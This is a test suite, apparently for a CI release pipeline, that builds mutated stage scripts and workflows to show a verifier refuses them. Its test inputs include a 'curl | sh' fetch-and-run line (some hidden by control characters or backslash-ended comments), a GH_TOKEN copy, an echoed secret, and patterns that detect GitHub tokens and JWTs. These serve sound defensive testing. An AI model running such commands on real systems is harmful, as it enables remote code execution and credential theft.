probe() { # probe KIND LABEL PYEXPR   L is the list of expected lines; the mutated list is written as a script and must be refused
  local kind=$1 label=$2 expr=$3 f="$work/probe.sh"
  python3 - "$shape" "$kind" "$f" "$expr" <<'PY' || { bad "probe did not build: $label"; return; }
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
L = S.expected_lines(sys.argv[2])
L = eval(sys.argv[4])
open(sys.argv[3], "w").write("#!/usr/bin/env bash\n" + "\n".join(L) + "\n")
PY
  expect caught "$label" command script "$f" "$kind"
}
# The sweeps below try every deletion, swap, suffix and insertion; the probes name the mutations a reviewer asked about that are not one of those.
probe apk              "AC3 a network fetch inside the admission step"              'L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
probe apk              "AC3 python -c fetching and running code"                    'L[:1] + ["python3 -c \"import urllib.request\""] + L[1:]'
probe apk              "AC3 an unlisted script"                                     'L[:1] + ["bash bin/anything.sh"] + L[1:]'
probe apk              "AC3 a failure ignored with || :"                            'L[:5] + [L[5] + " || :"] + L[6:]'
probe apk              "AC3 set +eu"                                                'L[:1] + ["set +eu"] + L[1:]'
probe apk              "AC3 set -euo pipefail missing"                              'L[1:]'
probe assemble "AC3 the verification wrapped in a never-true if (rule 58)" \
       'L[:2] + ["if [ \"${GITHUB_RUN_ATTEMPT:-1}\" = 0 ]; then"] + L[2:4] + ["fi"] + L[4:]'
probe apk              "AC3 a case dispatch instead of four files"                  '["case \"$1\" in", "apk)"] + L + [";;", "esac"]'
probe apk              "AC3 admission after the build started"                      'L[:5] + [L[1]] + L[5:]'
probe apk              "AC3 GH_TOKEN not unset after admission (cache's scripts would see it)" '[l for l in L if l != "unset GH_TOKEN"]'
probe apk              "AC3 GH_TOKEN unset in the wrong place"                      'L[:2] + L[3:5] + ["unset GH_TOKEN"] + L[5:]'
probe apk "AC6 the stage runs the sysctl itself (cache's scripts do)" \
       'L[:4] + ["sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0"] + L[4:]'
probe assemble         "AC6 the stage wraps cache's script in unshare"              'L[:-3] + ["sudo unshare -n " + L[-3]] + L[-2:]'
probe apk              "AC6 GOPROXY set (cache's script refuses anything but off)"  'L[:1] + ["export GOPROXY=off"] + L[1:]'
probe apk              "AC6 the release signing key variable (rule 23)"             'L[:1] + ["export APK_RELEASE_SIGNING_KEY=x"] + L[1:]'
probe apk              "AC6 --signing-key passed"                                   'L[:5] + [L[5] + " --signing-key k"] + L[6:]'
probe apk              "AC6 the build date is the wall clock, not the tagged commit" 'L[:3] + ["export SOURCE_DATE_EPOCH=\"$(date +%s)\""] + L[5:]'
probe apk              "AC6 SOURCE_DATE_EPOCH assigned and exported in ONE line (it masks a failing print)" 'L[:3] + ["export " + L[3]] + L[5:]'
probe assemble "AC6 a later SOURCE_DATE_EPOCH override on an image build" \
       '[("SOURCE_DATE_EPOCH=1 " + l if "assemble-image.sh --variant fips" in l else l) for l in L]'
probe assemble "AC11 a direct apko call" \
       'L[:-3] + ["apko build --lockfile out/production.lock.json build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe assemble "AC11 apko build without the lock (a different image digest per the real run)" \
       'L[:-3] + ["apko build build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe assemble         "AC11 a temp copy of the config"                             'L[:-3] + ["cp build/apko.yaml \"$RUNNER_TEMP/apko.yaml\""] + L[-3:]'
probe assemble "AC11 --apko-config pointing at an absolute path" \
       '[l + " --apko-config /work/archive/apko.yaml" if "assemble-image.sh --variant production" in l else l for l in L]'
probe assemble "AC11 --apko-config even at the fixed relative path (the script default is the path)" \
       '[l + " --apko-config build/apko.yaml" if "assemble-image.sh --variant production" in l else l for l in L]'
probe assemble "AC11 --render-dir (a rendered copy of the config)" \
       '[l + " --render-dir /tmp/r" if "assemble-image.sh --variant production" in l else l for l in L]'
probe assemble "AC11 --lockfile passed by the stage" \
       '[l + " --lockfile out/production.lock.json" if "assemble-image.sh --variant production" in l else l for l in L]'
probe assemble         "AC11 a cd away from the repo root"                          'L[:1] + ["cd build"] + L[1:]'
probe assemble         "AC11 --archive pointing at another directory than the archive" '[l.replace("--archive archive", "--archive /tmp/other") for l in L]'
probe assemble "AC11 --melange-repo pointing at an unverified download" \
       '[l.replace("--melange-repo melange-repo", "--melange-repo apk/ubuntu-24.04") for l in L]'
probe apk              "AC6 a source dir other than the checkout (another commit)"  '[l.replace("--source-dir . ", "--source-dir /tmp/other ") for l in L]'
probe apk "AC3 the version check on a directory other than the built one" '[l.replace("--apk-dir \"out/$(uname -m)\"", "--apk-dir /bin") for l in L]'
probe apk              "AC3 the version check missing for the fips apk (rule 24 covers both)" '[l for l in L if "--variant fips --tag" not in l]'
probe assemble         "AC3 an apk record not verified"                             '[l for i, l in enumerate(L) if i != 3]'
probe assemble         "AC3 the files not bound to the record (the bind lines missing)" '[l for l in L if "chain-verify.py bind" not in l]'
probe assemble         "AC3 bound with the Rebuild step name (a Rebuild record can stand in)" '[l.replace("bind --step apk", "bind --step rapk") for l in L]'
probe assemble         "AC3 the records verified AFTER the files are bound"         'L[:2] + L[4:6] + L[2:4] + L[6:]'
probe assemble "AC3 verified as the wrong stage" '[l.replace("verify --stage build", "verify --stage rebuild", 1) for l in L]'
probe assemble         "AC9 digests.json forged by a plain write after the merge"   'L + ["printf \x27{}\x27 > digests.json"]'
probe assemble         "AC9 digests.json written by hand instead of by the merge"   '[l for l in L if "items-merge" not in l] + ["echo {} > digests.json"]'
probe assemble         "AC9 the archives built after the merge (their digests would not be in digests.json)" 'L[:-2] + L[-1:] + L[-2:-1]'
probe rebuild-apk      "005-AC1 Build's record not verified FIRST (stage-start after the build)" 'L[:2] + L[3:5] + L[2:3] + L[5:]'
probe rebuild-apk      "005-AC1 a command between the policy and stage-start"       'L[:2] + ["python3 bin/build-admit.py run"] + L[2:]'
probe rebuild-assemble "005-AC2 no comparison"                                      'L[:-1]'
probe rebuild-assemble "005-AC2 the comparison against Rebuild's own items" \
       'L[:-1] + [L[-1].replace("--expected build-in/items.json", "--expected items.json")]'
probe rebuild-assemble "005-AC2 stage-start missing (Build's record is never verified)" '[l for l in L if "stage-start" not in l]'
probe rebuild-assemble "005-AC2 Rebuild publishes (a copy of its dist)"             'L + ["cp -r dist release"]'
probe rebuild-assemble "005-AC6 Rebuild assembles with other arguments than Build" \
       '[l.replace("--keyring-dir keyring", "--keyring-dir other") if "variant fips" in l else l for l in L]'
# every deletion, swap, suffix and insertion, on every line of every kind
sweep() {
  python3 - "$shape" "$1" "$work" <<'PY' && ok "AC3 sweep ($1): every deletion, swap, suffix and inserted command on every line is refused" \
    || bad "AC3 sweep ($1) let a mutation through"
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
kind, w = sys.argv[2:4]
L = S.expected_lines(kind)
SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
            " ; true", " | tee x", " > /dev/null")
EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "sudo true", "cd /tmp",
          "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
escaped = []
def check(tag, lines):
    f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
    if not S.script(f, kind): escaped.append(tag)
for i in range(len(L)):
    check("delete %d" % i, L[:i] + L[i + 1:])
    for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
    for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
    if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
for tag in escaped: print("ESCAPED:", tag)
sys.exit(1 if escaped else 0)
PY
}
for k in $KINDS; do sweep "$k"; done
# the way lines are read: comments, blank lines and trailing-backslash breaks are fine; an indented command is not; and bash and Python disagree about
# VT, FF, FS, NEL and U+2028 (Python splits lines or strips space there, bash does not), so any control character other than tab and newline is refused
python3 - "$shape" "$work" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w, L = sys.argv[2], S.expected_lines("apk")
def put(name, text): open("%s/%s.sh" % (w, name), "w").write(text)
put("c-ok", "#!/usr/bin/env bash\n# a comment\n\n" + "\n".join(L[:2]) + "\n# another\n" + "\n".join(L[2:]) + "\n")
put("c-indent", "#!/usr/bin/env bash\n" + "\n".join(L[:2]) + "\n  " + L[2] + "\n" + "\n".join(L[3:]) + "\n")
for name, ch in (("vt", "\x0b"), ("ff", "\x0c"), ("fs", "\x1c"), ("nel", "\x85"), ("ls", "\u2028")):
    put("c-" + name + "-hide", "#!/usr/bin/env bash\n" + L[0] + ch + "curl -s https://example.com | sh\n" + "\n".join(L[1:]) + "\n")      # one line for bash
    put("c-" + name + "-comment", "#!/usr/bin/env bash\n# a note" + ch + "curl -s https://example.com | sh\n" + "\n".join(L) + "\n")        # a comment for bash
PY
python3 - "$shape" "$work" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w, L = sys.argv[2], S.expected_lines("apk")
def put(name, text): open("%s/%s.sh" % (w, name), "wb").write(("#!/usr/bin/env bash\n" + text).encode())
body = "\n".join(L) + "\n"
put("c-cr-glued", L[0] + "\n" + L[1] + "\r" + L[2] + "\n" + "\n".join(L[3:]) + "\n")       # one line for bash, two for Python
put("c-crlf", body.replace("\n", "\r\n"))
put("c-comment-backslash", L[0] + "\n# a note \\\ncurl -s https://example.com | sh\n" + "\n".join(L[1:]) + "\n")                   # bash runs the curl line
put("c-token-saved", "\n".join(L[:2]) + '\n# keep the token for later \\\nexport GHT="$GH_TOKEN"\n' + "\n".join(L[2:]) + "\n")
put("c-bare-backslash", "\n".join(L[:3]) + "\n" + L[3] + "\\\n" + "\n".join(L[4:]) + "\n")                                         # joins with no space
put("c-open-continuation", body + L[-1] + " \\\n")
PY
expect ok     "AC3 comments and blank lines are not commands" "" script "$work/c-ok.sh" apk
expect caught "AC3 a lone CR glued between two grammar lines (Python reads two lines, bash one)" "control character U+000D" script "$work/c-cr-glued.sh" apk
expect caught "AC3 a CRLF script" "control character U+000D" script "$work/c-crlf.sh" apk
expect caught "AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)" command script "$work/c-comment-backslash.sh" apk
expect caught "AC3 a comment ending in a backslash does not hide an export of the token before it is unset" command script "$work/c-token-saved.sh" apk
expect caught "AC3 a backslash at the end of a line with no space before it" "not preceded by a space" script "$work/c-bare-backslash.sh" apk
expect caught "AC3 a script that ends in a line continuation" "ends in a line continuation" script "$work/c-open-continuation.sh" apk
expect caught "AC3 an indented command is not the grammar line" command script "$work/c-indent.sh" apk
for name in vt ff fs nel ls; do
  expect caught "AC3 control character ($name) joined to a grammar line" "control character" script "$work/c-$name-hide.sh" apk
  expect caught "AC3 control character ($name) hidden in a comment" "control character" script "$work/c-$name-comment.sh" apk
done
# ---- Build and Rebuild assemble identically (REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC6) -----------------------------------------------------------
LA="$work/s-assemble.sh"; LR="$work/s-rebuild-assemble.sh"
expect ok "AC11/005-AC6 fixture: Build and Rebuild assemble with the same script and arguments; no stage file names apko" "" lockflow "$LA" "$LR" \
       "$work/build.yml" "$work/rebuild.yml"
replace "$LR" "$work/lf_date.sh" 'assemble-image.sh --variant production' 'assemble-image.sh --build-date 2026-10-09T00:00:00Z --variant production' \
       && expect caught "005-AC6 Rebuild passes its own --build-date" "not identical" lockflow "$LA" "$work/lf_date.sh"
replace "$LR" "$work/lf_ver.sh" '--variant production --version "${GITHUB_REF_NAME#v}"' '--variant production --version "9.9.9"' && expect caught \
       "005-AC6 Rebuild's version differs from Build's" "not identical" lockflow "$LA" "$work/lf_ver.sh"
replace "$work/build.yml" "$work/lf_apko.yml" 'run: bash bin/witnessed.sh build bin/build-stage-assemble.sh' \
       'run: bash bin/witnessed.sh build bin/build-stage-assemble.sh && apko build build/apko.yaml fscache:x out.tar' && expect caught \
       "AC11 a stage workflow names apko in a run step" apko lockflow "$LA" "$LR" "$work/lf_apko.yml"
# ---- the scripts are listed with their sha256 (PR 1's chain-scripts.json design) --------------------------------------------------------------
mkdir -p "$work/listed/bin"
for k in $KINDS
do cp "$work/s-$k.sh" "$work/listed/bin/build-stage-$k.sh"
done
cp "$work/witnessed.sh" "$work/listed/bin/witnessed.sh"
expect ok "AC3 fixture: the five scripts (four stage scripts and bin/witnessed.sh) are rows of chain-scripts.json with the committed bytes' sha256" "" \
       listed "$work/chain-scripts.json" "$work/listed"
echo '# changed after listing' >> "$work/listed/bin/build-stage-apk.sh"
expect caught "AC3 a script changed after it was listed is refused (the sha256 binding)" "sha256" listed "$work/chain-scripts.json" "$work/listed"
python3 - "$work/chain-scripts.json" "$work/chain-scripts-short.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
d["scripts"] = d["scripts"][1:]
json.dump(d, open(sys.argv[2], "w"))
PY
expect caught "AC3 a script that is not a row of chain-scripts.json is refused" "not a row" listed "$work/chain-scripts-short.json" "$work/listed"
# ---- the job graph of release.yml (REQ-CHAIN-005-AC5) -----------------------------------------------------------------------------------------
expect ok "005-AC5 fixture: build -> (rebuild || check) -> release with sign beside them; other jobs ignored" "" graph "$work/release.yml"
gr() { replace "$work/release.yml" "$work/$1.yml" "$3" "$4" && expect caught "$2" "$5" graph "$work/$1.yml"; return 0; }
GATE_BODY="(github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true"
GATE="\${{ $GATE_BODY }}"
OLDDRY="\${{ !cancelled() && (needs.admission.result == 'success' || inputs.dry-run) }}"
TAGONLY="\${{ startsWith(github.ref, 'refs/tags/v') }}"
RELIF="\${{ !inputs.dry-run }}"
SIGN_HEAD="  sign:\n    if: $GATE\n    needs: build"
BUILD_USES="    uses: ./.github/workflows/stage-build.yml"
BUILD_HEAD="    if: $GATE\n$BUILD_USES"
REL_HEAD="  release:\n    if: $RELIF\n    needs: [rebuild, check, sign]"
gr g1  "005-AC5 rebuild waits for check" '  rebuild:\n    needs: build' '  rebuild:\n    needs: [build, check]' "rebuild must need exactly"
gr g2  "005-AC5 check waits for rebuild" '  check:\n    needs: build' '  check:\n    needs: [build, rebuild]' "check must need exactly"
gr g3  "005-AC5 release does not need rebuild" 'needs: [rebuild, check, sign]' 'needs: [check, sign]' "release must need exactly"
gr g4 "005-AC5 sign does not need build" "$SIGN_HEAD" "  sign:\n    if: $GATE\n    needs: check" \
    "sign must need exactly"
gr g5  "005-AC5 rebuild with an if (it runs after build through needs; an if could skip it)" '  rebuild:\n    needs: build' \
       '  rebuild:\n    needs: build\n    if: always()' "rebuild may not carry an if"
gr g5b "005-AC5 check with an if (even the gate)" '  check:\n    needs: build' "  check:\n    needs: build\n    if: $GATE" "check may not carry an if"
gr g6  "005-AC5 release ungated while the gate G is used (a dry run would publish)" "$REL_HEAD" '  release:\n    needs: [rebuild, check, sign]' \
       "release must carry exactly the if"
gr g6b "005-AC5 release runs when a stage failed (if: always())" "$REL_HEAD" '  release:\n    if: always()\n    needs: [rebuild, check, sign]' \
       "release must carry exactly the if"
gr g7  "005-AC5 release runs when a stage failed (!cancelled())" "$REL_HEAD" "  release:\n    if: \${{ !cancelled() }}\n    needs: [rebuild, check, sign]" \
       "release must carry exactly the if"
gr g7b "005-AC5 release gated by G (a dry-run dispatch would call stage-promote)" "$REL_HEAD" "  release:\n    if: $GATE\n    needs: [rebuild, check, sign]" \
       "release must carry exactly the if"
gr g8  "005-AC5 a failed rebuild does not fail the run (continue-on-error)" '  rebuild:\n    needs: build' \
       '  rebuild:\n    continue-on-error: true\n    needs: build' "keys outside"
gr g9 "005-AC5 check calls another stage file" 'uses: ./.github/workflows/stage-verify.yml' 'uses: ./.github/workflows/stage-promote.yml' \
       "check must call exactly"
gr g10 "005-AC5 secrets: inherit on a stage call" 'uses: ./.github/workflows/stage-reproducibility.yml' \
       'uses: ./.github/workflows/stage-reproducibility.yml\n    secrets: inherit' "keys outside"
gr g11 "005-AC5 the Rebuild job is not named rebuild (a failure would not name the stage)" '  rebuild:' '  reproducibility:' "rebuild is missing"
gr g12 "005-AC5 release without sign" 'needs: [rebuild, check, sign]' 'needs: [rebuild, check]' "release must need exactly"
FAST='  release-fast:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-promote.yml\n    secrets: inherit\n  decide:'
EARLY='  publish-early:\n    needs: [build, sign]\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n'
EARLY="$EARLY"'    steps:\n      - run: gh release create v1 dist/*\n  decide:'
REMOTE='  remote:\n    needs: [build, sign]\n    uses: fosterstack/cache/.github/workflows/promote-v2.yml@1111111111111111111111111111111111111111\n  decide:'
gr g13 "005-AC5 a copy of Release's call that skips Rebuild and Check (release-fast)" '  decide:' \
       "$FAST" "not one of the five chain jobs"
gr g14 "005-AC5 publish-early: a plain job after Sign that downloads dist and runs gh release create" '  decide:' \
       "$EARLY" "not one of the five chain jobs"
gr g15 "005-AC5 a job that calls a reusable workflow of another repository" '  decide:' \
       "$REMOTE" "job-level uses"
gr g16 "005-AC5 an allowed non-chain job (decide) given a job-level uses" '  decide:\n    if:' \
       '  decide:\n    uses: ./.github/workflows/ci.yml\n    if:' "job-level uses"
gr g17 "005-AC5 decide with a write it does not need (packages)" 'issues: write' 'issues: write\n      packages: write' "exactly the permissions"
gr g18 "005-AC5 decide with no permissions block of its own would inherit contents: read only (less than it needs: refused)" \
       '    permissions:\n      contents: read\n      checks: read\n      id-token: write\n      issues: write\n' '' "exactly the permissions"
gr g19 "005-AC5 a hostile-* job that can write" '  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read' \
       '  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write' "exactly the permissions"
gr g21 "005-AC5 build without the gate G (it would run on every push and the daily cron)" "$BUILD_HEAD" "    uses: ./.github/workflows/stage-build.yml" \
       "build must carry exactly one if"
gr g22 "005-AC5 build gated by always()" "$BUILD_HEAD" "    if: always()\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g23 "005-AC5 build gated by the tag gate alone while sign has G (the two differ)" "$BUILD_HEAD" \
       "    if: $TAGONLY\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g24 "005-AC5 G with an extra conjunct on build" "$BUILD_HEAD" \
    "    if: \${{ ($GATE_BODY) && github.actor != 'x' }}\n    uses: ./.github/workflows/stage-build.yml" \
       "build must carry exactly one if"
gr g25 "005-AC5 G with an or-branch for a schedule on build" "$BUILD_HEAD" \
       "    if: \${{ ($GATE_BODY) || github.event_name == 'schedule' }}\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g26 "005-AC5 a manual workflow_dispatch on a v* tag cannot satisfy G: the gate widened to dispatch is refused" "$BUILD_HEAD" \
       "    if: \${{ (github.event_name != 'schedule' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}\n$BUILD_USES" \
       "build must carry exactly one if"
gr g33 "005-AC5 the old dry-run gate with needs.admission on build (admission is gone; on a tag push everything would be skipped)" "$BUILD_HEAD" \
       "    if: $OLDDRY\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g27 "005-AC5 hostile-verify with environment: agent" "  hostile-verify:\n    needs: sign" \
    "  hostile-verify:\n    environment: agent\n    needs: sign" "may not name an environment"
HV='  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:'
gr g28 "005-AC5 hostile-verify with an app-token step" "$HV []" "$HV\n      - run: echo \${{ secrets.AUDITOR_APP_PRIVATE_KEY }}" "may not use secrets."
gr g29 "005-AC5 patch-notes needing sign as well as decide" "  patch-notes:\n    needs: decide" "  patch-notes:\n    needs: [decide, sign]" \
    "patch-notes must need exactly"
gr g30 "005-AC5 patch-failed in the environment that holds the App secrets" "  patch-failed:\n    needs: [build, release]" \
    "  patch-failed:\n    environment: agent\n    needs: [build, release]" "may not name an environment"
gr g31 "005-AC5 decide whose if is widened (it would run on a tag)" "github.ref == 'refs/heads/main' && " "" "must carry exactly the if"
gr g32 "005-AC5 patch-notes in another environment" "  patch-notes:\n    needs: decide\n    runs-on: ubuntu-latest\n    environment: agent" \
       "  patch-notes:\n    needs: decide\n    runs-on: ubuntu-latest\n    environment: release" "may name only environment: agent"
gr g34 "005-AC5 sign without the gate (it would run on every push and the daily cron)" "$SIGN_HEAD" "  sign:\n    needs: build" "sign must carry exactly one if"
gr g35 "005-AC5 sign gated by another condition" "$SIGN_HEAD" "  sign:\n    if: always()\n    needs: build" "sign must carry exactly one if"
gr g36 "005-AC5 sign gated by PR 1's dry-run-only gate (a tag push would not run it)" "$SIGN_HEAD" \
       "  sign:\n    if: \${{ inputs.dry-run }}\n    needs: build" "sign must carry exactly one if"
gr g37 "005-AC5 build has G but sign has the tag gate alone" "$SIGN_HEAD" "  sign:\n    if: $TAGONLY\n    needs: build" "sign must carry exactly one if"
gr g37b "005-AC5 sign with the old dry-run gate (needs.admission)" "$SIGN_HEAD" "  sign:\n    if: $OLDDRY\n    needs: build" "sign must carry exactly one if"
gr g38 "005-AC5 sign with write permissions beyond id-token and contents read" "      contents: read\n      id-token: write\n    uses" \
       "      contents: write\n      id-token: write\n    uses" "sign must hold exactly the permissions"
gr g39 "005-AC5 sign passing an extra input" "      digests: \${{ needs.build.outputs.digests }}" \
       "      digests: \${{ needs.build.outputs.digests }}\n      witness-artifact: witness-build" "sign must pass exactly with"
gr g40 "005-AC5 sign taking the digests from another job" "needs.build.outputs.digests" "needs.rebuild.outputs.digests" "sign must pass exactly with"
gr g41 "005-AC5 sign taking PR 1's placeholder (raw checksums.txt text) instead of the digests.json text" "needs.build.outputs.digests" \
       "needs.build.outputs.checksums" "sign must pass exactly with"
gr g20 "005-AC5 workflow-level permissions that write (every job would inherit them)" 'permissions:\n  contents: read\njobs' \
       'permissions:\n  contents: write\njobs' "workflow-level permissions"
# ---- the Witness record never holds the token variables (REQ-CHAIN-004-AC8); the consumer is `chain-verify.py verify` of the next stage --------
python3 - "$work" <<'PY'
import base64, json, sys
w = sys.argv[1]
def dsse(statement):
    return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(statement).encode()).decode(), "signatures": []}
def collection(variables, extra=None):
    attestations = [{"type": "https://witness.dev/attestations/environment/v0.1", "attestation": {"os": "linux", "variables": variables}},
                    {"type": "https://witness.dev/attestations/command-run/v0.1", "attestation": {"cmd": ["./bin/build-stage-apk.sh"], "exitcode": 0}}]
    if extra: attestations.append(extra)
    return {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
            "subject": [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json", "digest": {"sha256": "a" * 64}}],
            "predicate": {"name": "apk", "attestations": attestations}}
clean = {"GITHUB_SHA": "abc", "GITHUB_REF_NAME": "v0.3.0", "RUNNER_TEMP": "/home/runner/work/_temp"}
jwt = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvIn0.c2lnbmF0dXJl"
cases = {"clean": collection(clean),
         "masked": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="******")),
         "value": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="abcdef0123456789")),
         "url": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.actions.githubusercontent.com/x?api-version=2.0")),
         "runtime": collection(dict(clean, ACTIONS_RUNTIME_TOKEN="******")),
         "ghtoken": collection(dict(clean, GH_TOKEN="******")),
         "githubtoken": collection(dict(clean, GITHUB_TOKEN="******")),
         "ghs": collection(dict(clean, SOMETHING="ghs_" + "A" * 36)),
         "jwt": collection(dict(clean, SOMETHING=jwt)),
         "githubatt": collection(clean, {"type": "https://witness.dev/attestations/github/v0.1", "attestation": {"jwt": {"raw": jwt}}})}
for name, statement in cases.items():
    json.dump(dsse(statement), open("%s/env_%s.json" % (w, name), "w"))          # every record is a DSSE envelope: the names sit inside base64
json.dump(cases["clean"], open(w + "/env_bare.json", "w"))                        # a bare Statement is not what Witness -o writes
assert "ACTIONS_ID_TOKEN_REQUEST_TOKEN" not in open(w + "/env_masked.json").read(), "fixture: the name must be hidden inside the base64 payload"
PY
expect ok     "AC8 fixture: a clean environment record (a DSSE envelope) passes the judge" "" recordenv "$work/env_clean.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload (a text search of the file would miss it)" \
       ACTIONS_ID_TOKEN_REQUEST_TOKEN recordenv "$work/env_masked.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL recordenv "$work/env_url.json"
expect caught "AC8 judge: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN recordenv "$work/env_runtime.json"
expect caught "AC8 judge: GH_TOKEN (the admission token must not be recorded either)" GH_TOKEN recordenv "$work/env_ghtoken.json"
expect caught "AC8 judge: GITHUB_TOKEN" GITHUB_TOKEN recordenv "$work/env_githubtoken.json"
expect caught "AC8 judge: a GitHub token value in any variable" "GitHub token" recordenv "$work/env_ghs.json"
expect caught "AC8 judge: a compact JWT (the github attestor's raw token)" JWT recordenv "$work/env_githubatt.json"
expect caught "AC8 judge: a bare Statement is not the shape Witness writes" "DSSE" recordenv "$work/env_bare.json"
CV="$root/bin/chain-verify.py"
# record_env ok|refuse LABEL WORD NAME   the product check: `chain-verify.py record-env` is what `verify` runs on a build, rebuild or check record
record_env() {
  local want=$1 label=$2 word=$3 f="$work/env_$4.json" rc=0
  python3 "$CV" record-env --record "$f" > /dev/null 2> "$work/cv.err" || rc=$?
  if grep -q Traceback "$work/cv.err" 2> /dev/null; then bad "$label -> a Python traceback is a crash, not a refusal"
  elif [ "$want" = ok ]; then if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> exit $rc: $(head -c 140 "$work/cv.err" | tr '\n' ' ')"; fi
  elif [ "$rc" = 1 ] && head -1 "$work/cv.err" | grep -Eq '^refused at (build|rebuild): ' && grep -Fq -- "$word" "$work/cv.err"; then ok "$label"
  else bad "$label -> exit $rc, wanted 1 'refused at <stage>:' naming '$word': $(head -c 140 "$work/cv.err" | tr '\n' ' ')"; fi
}
[ -f "$CV" ] && ok "bin/chain-verify.py exists" || bad "bin/chain-verify.py does not exist (RED: not implemented yet)"
record_env ok     "AC8 record-env: a clean DSSE record is accepted" "" clean
record_env refuse "AC8 record-env: a masked ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN masked
record_env refuse "AC8 record-env: a real-looking value is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN value
record_env refuse "AC8 record-env: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL url
record_env refuse "AC8 record-env: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN runtime
record_env refuse "AC8 record-env: GH_TOKEN" GH_TOKEN ghtoken
record_env refuse "AC8 record-env: a GitHub token value" "GitHub token" ghs
record_env refuse "AC8 record-env: a compact JWT in a variable value" JWT jwt
record_env refuse "AC8 record-env: the github attestor's raw token" JWT githubatt
rc=0; python3 "$CV" record-env --record "$work/does-not-exist.json" > /dev/null 2>&1 || rc=$?
if [ -f "$CV" ] && [ "$rc" = 2 ]; then
  ok "AC8 a missing record is a usage error (exit 2), not a clean pass"
else
  bad "AC8 a missing record: exit $rc, wanted 2 (and the script must exist)"
fi
# ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2): the command is bounded and a failure leaves no record ------
# The fake timeout enforces FAKE_TIMEOUT_SECONDS (a short test limit) and logs the limit it was given: the helper must give 540. The fake witness runs the
# command after `--` and writes its -o record only when the command succeeded, as the real Witness does.
helper_tree() { # helper_tree DIR HELPER
  rm -rf "$1"; mkdir -p "$1/bin" "$1/fake" "$1/tmp"; cp "$2" "$1/bin/witnessed.sh"
  cat > "$1/bin/wrapped.sh" <<'EOF'
#!/usr/bin/env bash
echo "wrapped $*" >> calls.log
env > wrapped-env.txt
ls "$RUNNER_TEMP"/tok* > tokfiles-while-running.txt 2> /dev/null || true
[ -z "${SLEEP:-}" ] || sleep "$SLEEP"
echo "{}" > digests.json
exit "${WRAPPED_RC:-0}"
EOF
  cat > "$1/fake/witness" <<'EOF'
#!/usr/bin/env bash
echo "witness $*" >> calls.log
args=("$@"); record=; i=0; tokpath=
while [ $i -lt ${#args[@]} ]; do
  [ "${args[$i]}" = -o ] && record=${args[$((i + 1))]}
  [ "${args[$i]}" = --signer-fulcio-token-path ] && tokpath=${args[$((i + 1))]}
  [ "${args[$i]}" = -- ] && break
  i=$((i + 1))
done
# Witness loads its signer before the command runs, reading the token path ONCE; then nothing may hold the token as a file
cat "$tokpath" > signer-token.txt
ls "$RUNNER_TEMP"/tok* > tokfiles-at-start.txt 2> /dev/null || true
"${args[@]:$((i + 1))}" || exit $?
mkdir -p "$(dirname "$record")"; echo '{"record":true}' > "$record"
EOF
  cat > "$1/fake/curl" <<'EOF'
#!/usr/bin/env bash
echo curl >> calls.log
